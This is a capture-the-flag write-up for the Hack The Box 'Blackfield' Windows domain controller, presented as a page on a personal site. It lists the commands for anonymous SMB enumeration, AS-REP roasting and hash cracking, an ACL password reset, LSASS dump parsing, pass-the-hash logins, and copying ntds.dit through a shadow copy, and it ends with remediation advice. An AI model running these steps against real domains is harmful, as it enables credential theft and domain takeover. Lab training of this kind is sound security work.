+++
title = "Blackfield"
date = 2026-02-25
description = "Windows domain controller. An anonymous share leaks the user list, one of those users is AS-REP roastable with a rockyou password and can reset the password of an audit account, an LSASS dump on that account's forensic share gives up the NT hash of a backup account, and SeBackupPrivilege on a DC is enough to copy ntds.dit out of a shadow copy."
draft = false

[taxonomies]
tags = ["Active Directory", "Anonymous SMB share", "AS-REP roasting", "Hash cracking", "ACL abuse", "LSASS dump", "Pass the hash", "SeBackupPrivilege", "NTDS.dit dump"]

[extra]
platform = "htb"
os = "windows"
difficulty = "hard"
chain = ["Anonymous profiles$ share", "AS-REP roast", "ForceChangePassword", "LSASS dump on a share", "SeBackupPrivilege"]
+++

No creds on this one, just an IP.

## Recon

```text
53/tcp    open  domain         Simple DNS Plus
88/tcp    open  kerberos-sec   Microsoft Windows Kerberos
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
389/tcp   open  ldap           Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local)
445/tcp   open  microsoft-ds?
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC01; OS: Windows
```

A domain controller, `DC01` in `BLACKFIELD.local`, with WinRM open.

### a share that lists every user

```bash
smbclient //10.129.8.195/profiles$ -U ''
```

The null session gets in. `profiles$` holds over 300 directories, each named after a domain user. Those names go into `users.txt`.

## Foothold: AS-REP roasting support

Usernames and no password, so check who has pre-authentication disabled:

```bash
GetNPUsers.py BLACKFIELD.local/ -userfile users.txt -format hashcat -dc-ip 10.129.8.195
```

`support` does, and its hash comes back.

```bash
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt
```

```text
support : #00^BlackKnight
```

## Lateral: support to svc_backup

### support to audit2020

`support` has ForceChangePassword over `audit2020`, so i reset that account's password and used it from there. `audit2020` is the account that can read the `forensic` share.

### an LSASS dump on the forensic share

```bash
smbclient //10.129.8.195/forensic -U 'audit2020%<new password>'
```

In `\memory_analysis\`:

```text
get lsass.zip
```

Somebody dumped LSASS for analysis and left it on a share.

### reading the dump

```bash
pypykatz lsa minidump lsass.DMP
```

Two hashes worth keeping:

```text
svc_backup:     9658d1d1dcd9250115e2205d9f48400d
Administrator:  7f1e4ff8c6a8e6b6fcae2d9c0572cd62
```

The Administrator one is no use for a login. `svc_backup` works:

```bash
evil-winrm -i 10.129.8.195 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

## Privesc: SeBackupPrivilege to NTDS.dit

```powershell
whoami /priv
```

`svc_backup` holds `SeBackupPrivilege` and `SeRestorePrivilege`, which means it can read any file regardless of ACLs. On a DC that file is `ntds.dit`.

`ntds.dit` is locked while AD runs, so it has to come out of a shadow copy.

`diskshadow.txt`:

```text
set context persistent nowriters
add volume c: alias scripta
create
expose %scripta% z:
```

```powershell
diskshadow /s diskshadow.txt
robocopy /b Z:\Windows\NTDS\ C:\Temp\ ntds.dit
reg save hklm\system C:\Temp\system.bak
```

`/b` is backup mode, that's where `SeBackupPrivilege` gets used to skip the ACL check.

Download both files and dump them offline:

```bash
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
```

Administrator comes out as `184fb5e5178480be64824d4cd53b99ee`, a different hash than the one in the LSASS dump.

```bash
evil-winrm -i 10.129.8.195 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

done.

## What could Blackfield improve?

- no anonymous access to SMB shares. `profiles$` gave away the full user list.
- turn pre-authentication back on for `support` and give it a password that isn't in rockyou.
- `support` has no reason to hold ForceChangePassword over `audit2020`. That one ACL turns a helpdesk password into access to the forensic share.
- an LSASS dump doesn't belong on a file share, and every account in it needs a new password.
- an account with `SeBackupPrivilege` on a DC is a domain admin in practice. It should not be able to log on over WinRM.

## Appendix

- [Impacket](https://github.com/fortra/impacket)
- [pypykatz](https://github.com/skelsec/pypykatz)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [hashcat](https://hashcat.net/hashcat/)
